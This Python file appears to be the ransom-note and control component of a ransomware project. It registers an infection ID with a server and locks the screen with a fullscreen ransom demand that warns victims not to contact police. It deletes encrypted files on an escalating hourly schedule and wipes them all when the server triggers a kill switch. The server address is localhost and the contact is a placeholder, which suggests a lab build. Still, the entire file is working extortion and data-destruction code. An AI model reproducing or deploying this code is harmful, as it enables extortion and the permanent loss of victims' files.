import tkinter as tk
from tkinter import messagebox
import requests
import json
import os
from tkinter import ttk
import threading
import time
import sys

from utils import get_infection_id
from decrypt_runner import decrypt_all_files

SERVER_URL = "http://localhost:80"
META_PATH = "encryption_meta.json"

id_str = get_infection_id()

# 삭제 타이머 경로
TIMER_PATH = "deletion_timer.json"

def register_infection():
    try:
        requests.post(f"{SERVER_URL}/api/register_id", json={"id": id_str}, timeout=5)
        print("[✓] Infection ID registered:", id_str)
    except Exception as e:
        print("[!] Failed to register infection ID:", e)

register_infection()

NOTE_MESSAGE = (
    "!!! ATTENTION: YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n"
    "All of your important files have been ENCRYPTED with strong encryption.\n"
    "You have lost access to your photos, documents, and personal data.\n\n"
    "To recover your files:\n"
    "  1. DO NOT rename, move, or delete any encrypted files.\n"
    f"  2. Send an email to attacker@example.com and attach your unique Infection ID: {id_str}\n"
    "  3. Follow the payment instructions carefully.\n"
    "     Failure to pay will result in permanent loss of your data.\n\n"
    "WARNING:\n"
    "- DO NOT attempt to recover your files with any third-party tool or software.\n"
    "- DO NOT contact the police, antivirus, or IT experts. Any interference will result in PERMANENT DATA LOSS.\n"
    "- DO NOT SHUT DOWN or RESTART your computer during this process. It may result in additional files being deleted.\n\n"
    "TICK TOCK... Every hour, more files may be deleted FOREVER.\n"
    "Your activity is being monitored.\n"
    "Take immediate action to avoid permanent loss."
)

KILLSWITCH_MESSAGE = (
    "!!! KILL SWITCH ACTIVATED !!!\n\n"
    "Your decryption option has been permanently REVOKED.\n"
    "All encrypted files will now be destroyed with NO chance of recovery.\n"
    "This is a direct response to your actions or by command of the operator.\n\n"
    "Do NOT attempt to restart, shut down, or interfere. Your data is being wiped."
)

def get_or_create_start_time():
    if os.path.exists(TIMER_PATH):
        try:
            with open(TIMER_PATH, "r") as f:
                obj = json.load(f)
                return obj["start"]
        except Exception:
            pass
    start = int(time.time())
    with open(TIMER_PATH, "w") as f:
        json.dump({"start": start}, f)
    return start

start_time = get_or_create_start_time()

def show_file_list():
    files = []
    meta = {}
    if os.path.exists(META_PATH):
        try:
            with open(META_PATH, "r", encoding="utf-8") as f:
                meta = json.load(f)
                files = list(meta.keys())
        except Exception:
            files = []

    file_win = tk.Toplevel()
    file_win.title("Encrypted File List")

    screen_w = file_win.winfo_screenwidth()
    screen_h = file_win.winfo_screenheight()
    w = int(screen_w * 0.8)
    h = int(screen_h * 0.8)
    file_win.geometry(f"{w}x{h}")

    columns = ("No", "File Path", "Size (KB)", "Deleted")
    tree = ttk.Treeview(file_win, columns=columns, show="headings")
    tree.heading("No", text="No")
    tree.heading("File Path", text="File Path")
    tree.heading("Size (KB)", text="Size (KB)")
    tree.heading("Deleted", text="Deleted")

    tree.column("No", width=int(w*0.06), anchor="center")
    tree.column("File Path", width=int(w*0.6), anchor="w")
    tree.column("Size (KB)", width=int(w*0.15), anchor="center")
    tree.column("Deleted", width=int(w*0.15), anchor="center")

    yscroll = tk.Scrollbar(file_win, orient="vertical", command=tree.yview)
    tree.configure(yscrollcommand=yscroll.set)
    yscroll.pack(side="right", fill="y")
    tree.pack(expand=True, fill="both", side="left")

    for idx, fpath in enumerate(files, 1):
        try:
            stat = os.stat(fpath)
            size = round(stat.st_size / 1024, 1)
            deleted = ""
            if meta and isinstance(meta.get(fpath), dict):
                if meta[fpath].get("deleted"):
                    deleted = "yes"
        except Exception:
            size = "-"
            deleted = "yes"
        tree.insert("", "end", values=(idx, fpath, size, deleted))

def delete_all_files():
    if os.path.exists(META_PATH):
        try:
            with open(META_PATH, "r", encoding="utf-8") as f:
                meta = json.load(f)
                for fpath in list(meta.keys()):
                    try:
                        os.remove(fpath)
                        if isinstance(meta[fpath], dict):
                            meta[fpath]["deleted"] = True
                        else:
                            meta[fpath] = {"deleted": True}
                    except Exception:
                        if isinstance(meta[fpath], dict):
                            meta[fpath]["deleted"] = True
                        else:
                            meta[fpath] = {"deleted": True}
            with open(META_PATH, "w", encoding="utf-8") as f:
                json.dump(meta, f, indent=2)
        except Exception:
            pass

def check_killswitch_periodically(root):
    def loop():
        while True:
            try:
                resp = requests.get(f"{SERVER_URL}/api/killswitch", params={"id": id_str}, timeout=5)
                data = resp.json()
                if data.get("kill"):
                    delete_all_files()
                    tk.messagebox.showerror("KILL SWITCH", KILLSWITCH_MESSAGE)
                    os._exit(1)
            except Exception:
                pass
            time.sleep(10)
    threading.Thread(target=loop, daemon=True).start()

def file_deletion_timer():
    while True:
        elapsed_hours = int((time.time() - start_time) // 3600)
        if elapsed_hours > 0:
            try:
                if os.path.exists(META_PATH):
                    with open(META_PATH, "r", encoding="utf-8") as f:
                        meta = json.load(f)
                else:
                    meta = {}
            except Exception:
                meta = {}

            files = [fp for fp in meta if not (isinstance(meta[fp], dict) and meta[fp].get("deleted"))]
            to_del = min(len(files), 2 ** (elapsed_hours - 1))
            files_to_delete = files[:to_del]

            for fpath in files_to_delete:
                try:
                    os.remove(fpath)
                    if isinstance(meta[fpath], dict):
                        meta[fpath]["deleted"] = True
                    else:
                        meta[fpath] = {"deleted": True}
                except Exception:
                    if isinstance(meta[fpath], dict):
                        meta[fpath]["deleted"] = True
                    else:
                        meta[fpath] = {"deleted": True}
            try:
                with open(META_PATH, "w", encoding="utf-8") as f:
                    json.dump(meta, f, indent=2)
            except Exception:
                pass
        time.sleep(3600)

def show_warning(id_str):
    def submit_token():
        token = entry_token.get().strip()
        if not token:
            messagebox.showerror("Error", "Please enter the decryption token.")
            return

        try:
            response = requests.post(f"{SERVER_URL}/api/verify", json={"token": token, "id": id_str}, timeout=5)
            if response.status_code == 200:
                messagebox.showinfo("Success", "Authentication succeeded. Starting decryption.")
                decrypt_all_files(id_str)
                root.destroy()
            else:
                messagebox.showerror("Failed", "The token is invalid or already used.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to connect to the server:\n{e}")

    def update_timer():
        now = time.time()
        elapsed = now - start_time
        elapsed_hours = int(elapsed // 3600)
        next_delete = (elapsed_hours + 1) * 3600
        remain_sec = int(next_delete - elapsed)
        if remain_sec < 0:
            remain_sec = 0
        delete_count = 2 ** elapsed_hours
        timer_label["text"] = f"Next deletion in {remain_sec // 3600:02}:{(remain_sec % 3600) // 60:02}:{remain_sec % 60:02} — {delete_count} file(s) will be deleted"
        root.after(1000, update_timer)

    root = tk.Tk()
    root.title("Your Files Have Been Encrypted")
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.minsize(900, 600)

    top_frame = tk.Frame(root, bg="black")
    top_frame.pack(fill="both", expand=True)

    label = tk.Label(
        top_frame,
        text=NOTE_MESSAGE,
        font=("Arial", 20),
        fg="red",
        bg="black",
        justify="left",
        wraplength=800,
    )
    label.pack(pady=(40, 10), fill='both', expand=True)

    timer_label = tk.Label(
        top_frame,
        text="",
        font=("Arial", 18, "bold"),
        fg="yellow",
        bg="black"
    )
    timer_label.pack(pady=(5, 15), fill='x')

    btn_files = tk.Button(
        top_frame,
        text="View Encrypted File List",
        font=("Arial", 16),
        command=show_file_list
    )
    btn_files.pack(pady=10)

    bottom_frame = tk.Frame(root, bg="black")
    bottom_frame.pack(side="bottom", fill="x", pady=20)

    entry_token = tk.Entry(bottom_frame, font=("Arial", 18), width=40)
    entry_token.pack(side="left", padx=30, pady=10)

    btn_submit = tk.Button(bottom_frame, text="Request Decryption (Enter Token)", font=("Arial", 18), command=submit_token)
    btn_submit.pack(side="left", padx=30, pady=10)

    root.mainloop()
